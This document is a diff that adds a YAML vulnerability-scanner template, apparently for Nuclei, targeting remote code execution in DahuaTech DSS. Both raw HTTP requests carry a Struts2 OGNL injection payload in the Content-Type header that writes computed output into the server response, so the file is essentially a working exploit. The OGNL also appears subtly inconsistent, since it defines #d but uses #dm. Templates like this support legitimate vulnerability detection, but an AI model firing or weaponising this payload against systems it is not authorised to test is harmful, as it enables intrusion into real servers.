@@ -1,0 +1,39 @@
+id: dahuatech-dss-rce
+info:
+  name: DahuaTech DSS Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template exploits a remote code execution vulnerability in the DahuaTech DSS system.
+    It attempts to execute code via OGNL injection in specific endpoints.
+
+variables:
+  r1: "{{rand_int(40000, 100000)}}"
+  r2: "{{rand_int(40000, 100000)}}"
+
+http:
+  - raw:
+      - |
+        POST /admin/login_login.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: %{(#n='multipart/form-data').(#d=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#d):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println({{r1}}+{{r2}})).(#o.close())}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "{{to_number(r1)+to_number(r2)}}"
+        part: body
+
+  - raw:
+      - |
+        POST /portal/login_init.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: %{(#n='multipart/form-data').(#d=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#d):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println({{r1}}*{{r2}})).(#o.close())}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "{{to_number(r1)*to_number(r2)}}"
+        part: body
